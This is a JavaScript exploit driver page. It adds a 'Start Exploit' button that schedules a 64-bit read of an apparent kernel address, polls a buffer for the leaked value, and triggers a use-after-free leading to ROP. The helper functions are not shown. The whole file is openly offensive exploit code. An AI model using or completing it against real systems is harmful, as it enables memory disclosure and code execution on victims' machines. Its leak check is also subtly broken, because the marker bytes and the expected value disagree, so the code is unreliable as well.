window.read_target = new Uint8Array(8);

function start_exploit() {
  debug_log("Starting exploit manually...");

  // Fill marker
  for (let i = 0; i < 8; i++) read_target[i] = 0xAA;

  schedule_read64(0xFFFFFFFF82600000);

  // Start polling
  let tries = 0;
  const view = new DataView(read_target.buffer);
  const interval = setInterval(() => {
    const lo = view.getUint32(0, true);
    const hi = view.getUint32(4, true);
    if (lo !== 0xAAAAAAAA || hi !== 0xBBBBBBBB) {
      const val = (BigInt(hi) << 32n) | BigInt(lo);
      debug_log("✅ read64 result: 0x" + val.toString(16));
      clearInterval(interval);
    }
    if (++tries > 20) {
      debug_log("❌ No leak detected after 4s.");
      clearInterval(interval);
    }
  }, 200);

  // Now trigger exploit
  debug_log("🔥 Launching UAF → ROP...");
  triggerUAF();
}

window.onload = () => {
  debug_log("Page loaded. Click the button to begin.");

  const btn = document.createElement("button");
  btn.textContent = "▶️ Start Exploit";
  btn.style.fontSize = "24px";
  btn.style.padding = "10px 20px";
  btn.onclick = start_exploit;

  document.body.appendChild(btn);
};
